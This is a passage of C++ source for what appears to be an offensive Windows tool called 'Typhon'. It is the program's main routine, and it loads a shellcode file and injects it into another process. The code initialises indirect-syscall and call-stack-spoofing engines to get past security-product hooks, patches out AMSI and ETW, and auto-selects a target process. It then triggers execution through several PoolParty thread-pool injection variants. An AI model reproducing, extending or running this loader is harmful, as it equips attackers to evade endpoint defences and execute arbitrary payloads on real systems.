            printf("  Variant (all/safe/rec/direct/timer/io/1-8) [direct]: ");
            char varBuf[32] = {};
            if (!fgets(varBuf, sizeof(varBuf), stdin)) return 1;
            for (int i = 0; varBuf[i]; i++) { if (varBuf[i] == '\n' || varBuf[i] == '\r') varBuf[i] = 0; }
            uint16_t vmask = PoolParty::VARIANT_RECOMMENDED;
            if (varBuf[0] != 0) vmask = ParseVariantMask(varBuf);

            // Debug mode
            printf("  Debug mode? (y/N) [N]: ");
            char dbgBuf[8] = {};
            if (!fgets(dbgBuf, sizeof(dbgBuf), stdin)) return 1;
            bool dbg = (dbgBuf[0] == 'y' || dbgBuf[0] == 'Y');

            // Timer delay (only if timer variant selected)
            int64_t delay = 0;
            if (vmask & PoolParty::VARIANT_TP_TIMER) {
                printf("  Timer delay in ms (0 = immediate) [0]: ");
                char delBuf[32] = {};
                if (fgets(delBuf, sizeof(delBuf), stdin)) {
                    const char* d = delBuf;
                    while (*d >= '0' && *d <= '9') { delay = delay * 10 + (*d - '0'); d++; }
                }
            }

            // Build argv for DoBuild
            char arg0[] = "typhon";
            char arg1[] = "-build";
            char argO[] = "-o";
            char argV[] = "-variant";
            char argD[] = "-debug";

            char* buildArgv[16];
            int buildArgc = 0;
            buildArgv[buildArgc++] = arg0;
            buildArgv[buildArgc++] = arg1;
            buildArgv[buildArgc++] = inputBuf;
            buildArgv[buildArgc++] = argO;
            buildArgv[buildArgc++] = outputBuf;
            buildArgv[buildArgc++] = argV;
            buildArgv[buildArgc++] = varBuf[0] ? varBuf : (char*)"direct";
            if (dbg) buildArgv[buildArgc++] = argD;
            if (delay > 0) {
                char delayArg[] = "-delay";
                char delayVal[32];
                sprintf(delayVal, "%lld", delay);
                buildArgv[buildArgc++] = delayArg;
                buildArgv[buildArgc++] = delayVal;
            }

            return DoBuild(buildArgc, buildArgv);

        } else if (choice[0] == '2') {
            // Interactive inject mode
            printf("\n  -- Inject From File --\n\n");

            printf("  Shellcode path (.bin): ");
            char scBuf[MAX_PATH] = {};
            if (!fgets(scBuf, sizeof(scBuf), stdin)) return 1;
            for (int i = 0; scBuf[i]; i++) { if (scBuf[i] == '\n' || scBuf[i] == '\r') scBuf[i] = 0; }
            if (scBuf[0] == 0) { printf("  [-] No shellcode file\n"); return 1; }

            printf("  Target PID (0 = auto) [0]: ");
            char pidBuf[32] = {};
            if (fgets(pidBuf, sizeof(pidBuf), stdin)) {}
            DWORD pid = ParsePid(pidBuf);

            printf("  Variant (all/safe/rec/direct/timer/io/1-8) [direct]: ");
            char varBuf[32] = {};
            if (fgets(varBuf, sizeof(varBuf), stdin)) {}
            for (int i = 0; varBuf[i]; i++) { if (varBuf[i] == '\n' || varBuf[i] == '\r') varBuf[i] = 0; }

            // Rebuild argv and fall through to CLI mode
            char* newArgv[8];
            int newArgc = 0;
            char arg0[] = "typhon";
            newArgv[newArgc++] = arg0;
            newArgv[newArgc++] = scBuf;
            if (pid > 0) {
                char pidStr[16];
                sprintf(pidStr, "%u", pid);
                newArgv[newArgc++] = pidStr;
            }
            if (varBuf[0] != 0 && varBuf[0] != '\n' && varBuf[0] != '\r') {
                newArgv[newArgc++] = varBuf;
            }

            // Update argc/argv and fall through
            argc = newArgc;
            argv = newArgv;
            // Fall through to CLI inject mode below

        } else {
            // Show help
            printf("\n  CLI Usage:\n\n");
            printf("  Inject:\n");
            printf("    typhon.exe <shellcode.bin>                    auto-select target\n");
            printf("    typhon.exe <shellcode.bin> <pid>              specific target\n");
            printf("    typhon.exe <shellcode.bin> <pid> <variant>    specific variant\n\n");
            printf("  Build:\n");
            printf("    typhon.exe -build <file> [-o out.exe] [-variant X] [-debug]\n\n");
            printf("  Variants: all | safe | rec | direct | timer | io | 1-8\n\n");
            return 0;
        }
    }

    const char* shellcodePath = argv[1];
    DWORD targetPid = 0;
    uint16_t variantMask = PoolParty::VARIANT_RECOMMENDED;
    LONGLONG timerDelay = 0;

    if (argc >= 3) targetPid = ParsePid(argv[2]);
    if (argc >= 4) variantMask = ParseVariantMask(argv[3]);
    if (argc >= 5) {
        const char* d = argv[4];
        while (*d >= '0' && *d <= '9') { timerDelay = timerDelay * 10 + (*d - '0'); d++; }
    }

    printf("\n");
    printf("  Typhon\n");
    printf("  ======\n\n");

    // ====================================================================
    // Engine initialization
    // ====================================================================

    Prng::SeedFromHardware();

    // Tartarus Gate — SSN extraction
    {
        Tartarus::InitResult tr = Tartarus::Initialize();
        if (!tr.Success) {
            LOG_ERROR("Tartarus initialization failed");
            printf("  [-] Syscall engine failed to initialize\n");
            return 1;
        }
        LOG_SUCCESS("Tartarus: %d SSNs (%d hooked, %d failed)",
            tr.TotalExtracted, tr.HookedStubs, tr.FailedStubs);
        printf("  [+] Tartarus Gate: %d SSNs extracted", tr.TotalExtracted);
        if (tr.HookedStubs > 0) printf(" (%d recovered from hooks)", tr.HookedStubs);
        printf("\n");
    }

    // Syscall Manager — trampoline harvesting
    {
        SyscallManager::InitResult sr = SyscallManager::Initialize();
        if (!sr.Success) {
            LOG_ERROR("SyscallManager initialization failed");
            printf("  [-] Trampoline harvesting failed\n");
            return 1;
        }
        LOG_SUCCESS("SyscallManager: %d gadgets (%d quality)", sr.TotalGadgets, sr.QualityGadgets);
        printf("  [+] Trampolines: %d gadgets (%d high-quality)\n", sr.TotalGadgets, sr.QualityGadgets);
    }

    // Call-context hardening
    {
        CallContext::InitResult cr = CallContext::Initialize();
        if (!cr.Success) {
            LOG_ERROR("CallContext initialization failed");
            printf("  [-] Call-context hardening failed\n");
            return 1;
        }
        LOG_SUCCESS("CallContext: %d return addrs, context=%s, protocol=%s",
            cr.ReturnAddresses,
            cr.ContextStolen ? "STOLEN" : "NONE",
            cr.ActiveProtocol == CallContext::PROTOCOL_SDIE_CET ? "SDIE" : "VEH");
        printf("  [+] Call stack: %d return addrs, context %s, %s\n",
            cr.ReturnAddresses,
            cr.ContextStolen ? "stolen" : "synthetic",
            cr.CetDetected ? "CET active" : "VEH mode");
    }

    // Verify critical SSNs
    {
        const uint32_t required[] = {
            HASH_API("NtOpenProcess"), HASH_API("NtDuplicateObject"),
            HASH_API("NtQuerySystemInformation"), HASH_API("NtQueryObject"),
            HASH_API("NtQueryInformationWorkerFactory"), HASH_API("NtSetInformationWorkerFactory"),
            HASH_API("NtSetIoCompletion"), HASH_API("NtCreateSection"),
            HASH_API("NtMapViewOfSection"), HASH_API("NtUnmapViewOfSection"),
            HASH_API("NtReadVirtualMemory"), HASH_API("NtWriteVirtualMemory"),
            HASH_API("NtAllocateVirtualMemory"), HASH_API("NtFreeVirtualMemory"),
            HASH_API("NtClose"), HASH_API("NtCreateEvent"), HASH_API("NtSetEvent"),
        };
        int missing = 0;
        for (int i = 0; i < sizeof(required) / sizeof(required[0]); i++) {
            if (!Tartarus::GetSyscall(required[i])) missing++;
        }
        if (missing > 0) {
            printf("  [-] Missing %d critical SSNs\n", missing);
            return 1;
        }
    }

    // ====================================================================
    // AMSI/ETW bypass
    // ====================================================================
    {
        AmsiEtw::BypassResult ae = AmsiEtw::Run();
        printf("  [+] AMSI: %s\n", ae.AmsiSuccess ? "bypassed" : "skipped");
        printf("  [+] ETW:  %d functions patched, TEB %s\n",
            ae.EtwFunctionsPatched, ae.TebSuppressed ? "suppressed" : "skipped");
    }

    // ====================================================================
    // Load shellcode
    // ====================================================================
    {
        if (!LoadShellcodeFromFile(shellcodePath)) {
            printf("  [-] Failed to load shellcode: %s\n", shellcodePath);
            return 1;
        }
        printf("  [+] Shellcode: %zu bytes from %s\n", g_ShellcodeSize, shellcodePath);
    }

    // ====================================================================
    // Auto-find target if no PID specified
    // ====================================================================
    if (targetPid == 0) {
        targetPid = FindSuitableTarget();
        if (targetPid == 0) {
            printf("  [-] No suitable target process found. Specify a PID manually.\n");
            return 1;
        }
        printf("  [+] Auto-selected target: PID %u\n", targetPid);
    } else {
        printf("  [+] Target: PID %u\n", targetPid);
    }

    // ====================================================================
    // Inject
    // ====================================================================
    {
        printf("\n  [*] Injecting...\n");

        PoolParty::InjectResult ir = PoolParty::Inject(
            targetPid, g_Shellcode, g_ShellcodeSize, variantMask, timerDelay);

        const char* vname =
            ir.VariantUsed == PoolParty::VARIANT_WORKER_FACTORY ? "V1 Worker Factory" :
            ir.VariantUsed == PoolParty::VARIANT_TP_WORK        ? "V2 TP_WORK" :
            ir.VariantUsed == PoolParty::VARIANT_TP_IO          ? "V3 TP_IO" :
            ir.VariantUsed == PoolParty::VARIANT_TP_WAIT        ? "V4 TP_WAIT" :
            ir.VariantUsed == PoolParty::VARIANT_TP_ALPC        ? "V5 TP_ALPC" :
            ir.VariantUsed == PoolParty::VARIANT_TP_JOB         ? "V6 TP_JOB" :
            ir.VariantUsed == PoolParty::VARIANT_TP_DIRECT      ? "V7 TP_DIRECT" :
            ir.VariantUsed == PoolParty::VARIANT_TP_TIMER       ? "V8 TP_TIMER" : "Unknown";

        if (ir.Success) {
            printf("  [+] Success via %s\n", vname);
            printf("  [+] Shellcode @ 0x%p\n", ir.ShellcodeAddress);
            printf("  [+] Structure @ 0x%p\n\n", ir.StructureAddress);
        } else {
            printf("  [-] Failed via %s\n", vname);
            printf("  [-] Handle hijack: %s\n", ir.HandleHijackOk ? "OK" : "FAIL");
            printf("  [-] Memory write:  %s\n", ir.MemoryWriteOk ? "OK" : "FAIL");
            printf("  [-] Exec trigger:  %s\n\n", ir.ExecutionTriggerOk ? "OK" : "FAIL");
        }
    }

    // ====================================================================
    // Cleanup
    // ====================================================================
    if (g_Shellcode) {
        Crypto::SecureZero(g_Shellcode, g_ShellcodeSize);
        typedef BOOL(WINAPI* VirtualFree_t)(LPVOID, SIZE_T, DWORD);
        VirtualFree_t pVF = (VirtualFree_t)Resolver::ResolveAPI(
            HASH_MODULE(L"kernel32.dll"), HASH_API("VirtualFree"));
        if (pVF) pVF(g_Shellcode, 0, MEM_RELEASE);
        g_Shellcode = nullptr;
    }

    CallContext::Shutdown();
    SyscallManager::Shutdown();
    Tartarus::Shutdown();
    Prng::Seed(0);

    return 0;
}
